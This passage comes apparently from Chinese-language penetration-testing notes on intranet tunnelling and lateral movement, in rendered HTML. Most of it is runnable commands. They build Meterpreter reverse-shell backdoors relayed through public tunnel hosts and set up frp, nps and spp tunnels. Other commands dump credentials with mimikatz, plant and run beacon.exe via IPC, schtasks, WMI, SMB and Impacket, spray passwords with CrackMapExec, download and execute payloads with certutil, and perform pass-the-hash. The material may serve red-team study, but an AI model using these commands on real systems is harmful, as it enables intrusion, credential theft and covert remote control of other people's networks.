class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务端配置：开通隧道-TCP协议-指向IP和端口-开通隧道-连接隧道</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">客户端连接服务端</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">控制端连接 Ngrok 的服务器</span></span><br><span class=\"line\">./sunny clientid 133328291918</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">客户端生成后门配置监听</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=free.idcfengye.com lport=10134 -f exe -o tcp.exe</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 8888</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h4 id=\"frp上线内网机器\"><a class=\"markdownIt-Anchor\" href=\"#frp上线内网机器\">#</a> Frp 上线内网机器</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务器修改配置文件frps.ini：</span></span><br><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7000</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">启动服务端：</span></span><br><span class=\"line\">./frps -c ./frps.ini</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">控制端修改配置文件frpc.ini：</span></span><br><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = 47.94.236.117</span><br><span class=\"line\">server_port = 7000 #frpc工作端口，必须和上面frps保持一致</span><br><span class=\"line\">[msf]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 5555 #转发给本机的 5555</span><br><span class=\"line\">remote_port = 6000 #服务端用 6000 端口转发给本机</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">启动客户端：</span> </span><br><span class=\"line\">./frpc -c ./frpc.ini</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf生成木马并监听</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6000 - f exe -o frp.exe</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set LHOST 127.0.0.1</span><br><span class=\"line\">set LPORT 5555</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<h4 id=\"nps上线内网机器\"><a class=\"markdownIt-Anchor\" href=\"#nps上线内网机器\">#</a> Nps 上线内网机器</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务端启动</span></span><br><span class=\"line\">./nps install &amp;&amp; ./nps</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问：</span></span><br><span class=\"line\">http://IP:8080/ admin/123</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建客户端，生成密匙</span></span><br><span class=\"line\">./npc -server=47.94.236.117:8024 -vkey=uajwhbu9155qh89v</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf生成木马，远程绑定5555,指向本地 6666</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=5555 - f exe -o nps.exe</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set LHOST 0.0.0.0</span><br><span class=\"line\">set LPORT 6666</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h4 id=\"spp上线内网机器\"><a class=\"markdownIt-Anchor\" href=\"#spp上线内网机器\">#</a> Spp 上线内网机器</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务端：监听本地的icmp数据</span></span><br><span class=\"line\">./spp -type server -proto ricmp -listen 0.0.0.0</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">客户端：将本地的 8082 给到 117 这 8081 上（TCP封装icmp）</span></span><br><span class=\"line\">spp -name &quot;test&quot; -type proxy_client -server 47.94.236.117 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS配置</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听器 1 ：http 47.94.236.117 8081</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听器 2 ：http 127.0.0.1 8082 - 生成后门</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"横向渗透技术\"><a class=\"markdownIt-Anchor\" href=\"#横向渗透技术\">#</a> 横向渗透技术</h3>\n<ul>\n<li>域信息收集</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用cs脚本收集是否存在域，域内用户，端口开放情况，明文和<span class=\"built_in\">hash</span>值</span></span><br><span class=\"line\">net user /domain （cs使用时需要在命令前加shell）</span><br><span class=\"line\">mimikatz logonpasswords</span><br><span class=\"line\">Ladon Adfinder BloodHound</span><br></pre></td></tr></table></figure>\n<h4 id=\"ipc-横向移动\"><a class=\"markdownIt-Anchor\" href=\"#ipc-横向移动\">#</a> IPC 横向移动</h4>\n<p>IPC 是专用管道，可以实现对远程计算机的访问，需要使用目标系统用户的账号密码，使用 139 、 445 端口。</p>\n<p>（ 1 ）IPC 上线的使用流程</p>\n<p>建立 IPC 链接到目标主机、拷贝要执行的命令脚本到目标主机、查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本、删除 IPC 链接</p>\n<p>（ 2 ）IPC 使用时需要的命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工作组</span></span><br><span class=\"line\">net use \\\\server\\ipc$ &quot;password&quot; /user:username </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">域内</span></span><br><span class=\"line\">net use \\\\server\\ipc$ &quot;password&quot; /user:domain\\username </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看文件列表</span></span><br><span class=\"line\">dir \\\\xx.xx.xx.xx\\C$\\ </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载文件</span></span><br><span class=\"line\">copy \\\\xx.xx.xx.xx\\C$\\1.bat 1.bat </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">复制文件</span></span><br><span class=\"line\">copy 1.bat \\\\xx.xx.xx.xx\\C$ </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">删除IPC</span></span><br><span class=\"line\">net use \\\\xx.xx.xx.xx\\C$\\1.bat /del </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看对方共享</span></span><br><span class=\"line\">net view xx.xx.xx.xx </span><br></pre></td></tr></table></figure>\n<p>（ 3 ）建立 IPC 失败的原因</p>\n<p>目标系统不是 NT 或以上的操作系统、对方没有打开 IPC$ 共享、对方未开启 139、445 端口，或者被防火墙屏蔽、输出命令、账号密码有错误</p>\n<p><strong>IPC 渗透完整流程</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上线配置</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">正向：配置监听器beacon_bind_tcp并生成木马，木马运行连接</span></span><br><span class=\"line\">connect 192.168.3.32 4444</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">反向：选择需要转发的已经控制的肉鸡，代理转发-&gt;转发上线-&gt;beacon.exe</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Windows2012以下采用at命令</span></span><br><span class=\"line\">net use \\\\192.168.3.21\\ipc$ &quot;Admin12345&quot; /user:god.org\\administrator # 建立ipc连接</span><br><span class=\"line\">copy beacon.exe \\\\192.168.3.21\\c$ #拷贝执行文件到目标机器</span><br><span class=\"line\">at \\\\192.168.3.21 15:47 c:\\beacon.exe #添加计划任务</span><br><span class=\"line\">* 计划任务执行后，木马被执行，在cs上会上线</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Windows2012及其以上采用schtasks命令</span></span><br><span class=\"line\">net use \\\\192.168.3.32\\ipc$ &quot;admin!@#45&quot; /user:god.org\\administrator # 建立ipc连接</span><br><span class=\"line\">copy beacon.exe \\\\192.168.3.32\\c$ #复制文件到其C盘</span><br><span class=\"line\">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn beacon /sc DAILY /tr c:\\beacon.exe /F #创beacon任务对应执行文件</span><br><span class=\"line\">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class=\"line\">schtasks /delete /s 192.168.3.21 /tn beacon /f#删除beacon任务</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Impacket-Atexec 套件</li>\n</ul>\n<p>该工具是一个半交互的工具，适用于 Webshell 下，Socks 代理下；在渗透利 用中可以收集用户名、明文密码、密码 hash、远程主机等做成字典，批量测试。 一般选择 py 程序，比较轻量，体积较小，不易被识别。需要编写脚本进行批量 通过 IPC 通道下载木马，执行木马，针对不同的用户名，密码，hash 尝试。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py版：https://github.com/SecureAuthCorp/impacket</span></span><br><span class=\"line\">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class=\"line\">python atexec.py -hashes :ccef208c648* ./administrator@192.168.3.21 &quot;v&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Exe版：https://gitee.com/RichChigga/impacket-examples-windows</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS本地用户明文连接</span></span><br><span class=\"line\">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS域内用户明文连接</span></span><br><span class=\"line\">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS域内本地用户明文密文连接</span></span><br><span class=\"line\">shell atexec.exe - hashes :ccef208c648526* ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class=\"line\">shell atexec.exe - hashes :ccef208c648526* god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"wmi-横向渗透\"><a class=\"markdownIt-Anchor\" href=\"#wmi-横向渗透\">#</a> WMI 横向渗透</h4>\n<p>WMI 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">wmic 内部：(单执行，只能用明文密码)</span></span><br><span class=\"line\">wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process</span><br><span class=\"line\">call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp; c:/beacon.exe&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">cscript 内置：(生成交互式shell)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">先上传wmiexec.vbs至肉机</span></span><br><span class=\"line\">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Impacket-Wmiexec 套件</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过明文密码或者<span class=\"built_in\">hash</span>执行命令：</span></span><br><span class=\"line\">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class=\"line\">wmiexec -hashes :518b98ad4178a ./administrator@192.168.3.32 &quot;whoami&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载后门并执行：</span></span><br><span class=\"line\">wmiexec ./Administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp; c:/beacon.exe &quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"smb-横向渗透\"><a class=\"markdownIt-Anchor\" href=\"#smb-横向渗透\">#</a> SMB 横向渗透</h4>\n<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行， 445 服务端口开放。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">内置命令psexec64 、外部命令psexec</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">内部</span></span><br><span class=\"line\">psexec64 \\\\192.168.3.32 - u administrator - p admin!@#45 - s cmd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">外部</span></span><br><span class=\"line\">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">插件：cs-psexec</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">内置命令services</span></span><br><span class=\"line\">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\\Windows\\System32\\shell.exe</span><br><span class=\"line\">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Impacket-Smbexec 套件</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">针对明文密码</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">普通用户</span></span><br><span class=\"line\">smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">域内用户</span></span><br><span class=\"line\">smbexec god/administrator:admin!@#45@192.168.3.32</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">针对<span class=\"built_in\">hash</span>（交互式的shell，可以在cmd上下载木马绕过杀软）</span></span><br><span class=\"line\">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class=\"line\">smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</span><br></pre></td></tr></table></figure>\n<h4 id=\"crackmapexec\"><a class=\"markdownIt-Anchor\" href=\"#crackmapexec\">#</a> CrackMapExec</h4>\n<p>（ 1 ）工具批量密码喷射（支持 hash）</p>\n<p>Github：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BvcmNoZXR0YS1JbmR1c3RyaWVzL0NyYWNrTWFwRXhlYw==\">https://github.com/Porchetta-Industries/CrackMapExec</span><br>\n 官方手册：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcGduLmdpdGJvb2suaW8vY3JhY2ttYXBleGVjLw==\">https://mpgn.gitbook.io/crackmapexec/</span><br>\n 部分案例：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xODQ1NzMuaHRtbA==\">https://www.freebuf.com/sectool/184573.html</span><br>\n 下载对应 release，建立 socks 连接，设置 socks 代理，配置规则，调用！</p>\n<p>（ 2 ）Linux Proxychains 使用</p>\n<p>安装使用：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMDg2NjkwL2FydGljbGUvZGV0YWlscy8xMjE3Nzk4MzI=\">https://blog.csdn.net/qq_53086690/article/details/121779832</span><br>\n 代理配置：Proxychains.conf<br>\n 代理调用：Proxychains 命令</p>\n<p>（ 3 ）CrackMapExec 使用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射域用户登录</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射本地用户登录</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射本地登录命令执行</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;whoami&#x27; --local-auth</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射本地登录命令执行上线</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21- 32 - u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#x27; --local-auth</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射域登录命令执行上线</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21- 32 - u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp; c:/4455.exe&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射本地和域登录命令执行全自动上线</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21- 32 - u user.txt -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp; c:/4455.exe&#x27;</span><br><span class=\"line\">proxychains python cme smb 192.168.3.21- 32 - u administrator -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp; c:/4455.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure>\n<h4 id=\"pth-哈希传递攻击\"><a class=\"markdownIt-Anchor\" href=\"#pth-哈希传递攻击\">#</a> PTH 哈希传递攻击</h4>\n<p>PTH (pass the hash)：哈希传递攻击，利用的 lm 或 ntlm 的值进行的渗透测试（NTLM 认证攻击）</p>\n<p>PTH = Pass The Hash，通过密码散列值 (通常是 NTLM Hash) 来进行攻击。 在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账 号和密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就 可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在 Window S erver 2012 R2 之前使用到的密码散列值是 LM、NTLM，在 2012 R2 及其版本 之后使用到的密码散列值是 NTLM Hash。</p>\n<p>（ 1 ）mimikatz</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">改回连时间-提权至system-继续改回连时间-导出<span class=\"built_in\">hash</span>和明文此方法会在肉鸡上弹出cmd，如果条件不满足，则一般不采用这种方法</span></span><br><span class=\"line\">mimikatz privilege::debug</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过pth导入票据攻击此票据对应的机器</span></span><br><span class=\"line\">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a5xxx</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在肉鸡上弹出来的cmd执行以下命令</span></span><br><span class=\"line\">net use \\\\192.168.3.32\\c$</span><br><span class=\"line\">copy beacon.exe \\\\192.168.3.32\\c$</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过创建服务绑定exe程序上线exe程序</span></span><br><span class=\"line\">sc \\\\sqlserver create bshell binpath= &quot;c:\\4.exe&quot;</span><br><span class=\"line\">sc \\\\sqlserver start bshell</span><br></pre></td></tr></table></figure>\n<p>（ 2 ）impacket 套件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将肉鸡进行socket代理转发，用proxifier建立规则，通过本机的套件进行测试，通过cs的文件浏览功能将木马放在跳板机web上</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用cmd窗口下载木马运行上线。当<span class=\"built_in\">hash</span>与所要攻击的主机及用户名对应的时候，则会取得权限。但是受限于这三种方法的协议端口是否正常开启。</span></span><br><span class=\"line\">psexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class=\"line\">smbexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class=\"line\">wmiexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class=\"line\">python psexec.py -hashes :518b98ad48a* ./administrator@192.168.3.32</span><br><span class=\"line\">python smbexec.py -hashes :518b98ad78a* ./administrator@192.168.3.32</span><br><span class=\"line\">python wmiexec.py -hashes :518b98ad41a* 